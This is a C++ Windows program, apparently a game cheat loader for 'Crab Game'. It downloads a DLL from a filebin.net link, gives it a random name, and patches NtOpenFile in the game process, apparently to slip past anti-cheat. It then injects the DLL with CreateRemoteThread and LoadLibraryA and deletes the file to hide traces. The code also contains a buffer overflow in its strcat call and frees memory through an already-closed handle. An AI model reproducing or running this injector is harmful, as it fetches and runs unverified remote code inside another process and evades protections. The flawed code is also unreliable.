#define _CRT_SECURE_NO_WARNINGS
#include <urlmon.h>    
#pragma comment(lib, "Urlmon")
#include <windows.h>
#include <TlHelp32.h>
#include <chrono>
#include <thread>
#include <libloaderapi.h>
#include <ostream>
#include <Psapi.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <random>

// generate random const char* function
const char* random_string(size_t length)
{
	static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	char* result = new char[length + 1];
	std::random_device rd;
	std::mt19937 g(rd());
	std::uniform_int_distribution<int> dist(0, sizeof(charset) - 2);
	for (size_t i = 0; i < length; ++i)
		result[i] = charset[dist(g)];
	result[length] = '\0';
	return result;
}




void ErrorHandling(const char* FunctionName, const char* Message = "")
{
	if (strcmp(Message, "") == 0) {
		char err[256];
		DWORD code = GetLastError();
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, code,
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), err, 255, nullptr);
		char out[256];
		sprintf(out, "%s: %s", FunctionName, err);
		MessageBox(nullptr, out, "Injector", MB_OK | MB_ICONSTOP);
		exit(code);
	}
	else
	{
		char out[256];
		sprintf(out, "%s: %s", FunctionName, Message);
		MessageBox(nullptr, out, "Injector", MB_OK | MB_ICONSTOP);
		exit(-1);
	}

}

// rename file function
void RenameFile(const char* old_name, const char* new_name)
{
	MoveFileA(old_name, new_name);
}



// function to download file
void DownloadFile(const char* url, const char* file_name)
{
	HRESULT res = URLDownloadToFile(NULL, url, file_name, 0, NULL);

	if (res == S_OK) {
		return;
	}
	else {
		ErrorHandling("FileDownload", "Error downloading file");
	}
}


void BypassLoadLibrary(HANDLE hProcess) {
	const LPVOID ntOpenFile = GetProcAddress(LoadLibraryW(L"ntdll"), "NtOpenFile");
	if (ntOpenFile) {
		char oBytes[5];
		memcpy(oBytes, ntOpenFile, 5);
		WriteProcessMemory(hProcess, ntOpenFile, oBytes, 5, NULL);
	}
}

DWORD ProcessID(const char* ProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) return false;

	PROCESSENTRY32 ProcEntry;
	ProcEntry.dwSize = sizeof(PROCESSENTRY32);

	//Get the first process
	if (Process32First(hSnapshot, &ProcEntry)) {
		do
		{
			if (!strcmp(ProcEntry.szExeFile, ProcessName))
			{
				CloseHandle(hSnapshot);

				return ProcEntry.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &ProcEntry));
	}

	CloseHandle(hSnapshot);

	return 0;
}



BOOL FileExists(LPCTSTR szPath)
{
	DWORD dwAttrib = GetFileAttributes(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

HMODULE GrabModule(DWORD processID, const char* strModuleName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID);
	if (hSnapshot == INVALID_HANDLE_VALUE) return nullptr;

	MODULEENTRY32 ModEntry;

	if (Module32First(hSnapshot, &ModEntry))
	{
		do
		{
			if (!strcmp(ModEntry.szModule, strModuleName))
			{
				CloseHandle(hSnapshot);

				return HMODULE(ModEntry.modBaseAddr);
			}
		} while (Module32Next(hSnapshot, &ModEntry));
	}

	CloseHandle(hSnapshot);
	return nullptr;
}

int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow) {
	const char* fileName = strcat((char*)random_string(8), ".dll");
	std::cout << "Downloading DLL..." << std::endl;
	DownloadFile("https://filebin.net/eb766e3hdt8gi21f/CrabPot.dll", "c.dll");
	RenameFile("c.dll", fileName);

	std::cout << "DLL Downloaded" << std::endl;
	DWORD processID = ProcessID("Crab Game.exe");
	if (!processID) ErrorHandling("ProcessID", "Process ID not found");

	char dll[MAX_PATH];
	DWORD PathNameResult = GetFullPathName(fileName, MAX_PATH, dll, nullptr);
	if (!PathNameResult) ErrorHandling("GetFullPathName");
	if (PathNameResult > MAX_PATH) ErrorHandling("GetFullPathName", "Path Length too short");
	if (!FileExists(dll)) ErrorHandling("FileExists", "Dll to inject does not exist");
	if (GrabModule(processID, fileName)) ErrorHandling("GrabModule", "Dll already injected");

	HANDLE Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
	if (!Process) ErrorHandling("OpenProcess");

	BypassLoadLibrary(Process);

	LPVOID Memory = LPVOID(VirtualAllocEx(Process, nullptr, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
	if (!Memory) ErrorHandling("VirtualAllocEx");

	if (!WriteProcessMemory(Process, Memory, dll, MAX_PATH, nullptr)) ErrorHandling("WriteProcessMemory");

	HANDLE hThread = CreateRemoteThread(Process, nullptr, NULL, LPTHREAD_START_ROUTINE(LoadLibraryA), Memory, NULL, nullptr);
	if (!hThread) ErrorHandling("CreateRemoteThread");

	CloseHandle(Process);

	VirtualFreeEx(Process, LPVOID(Memory), 0, MEM_RELEASE);



	MessageBoxA(nullptr, "File successfully injected", "Injector", MB_OK | MB_ICONINFORMATION);
	DeleteFileA(fileName);
	return 0;

}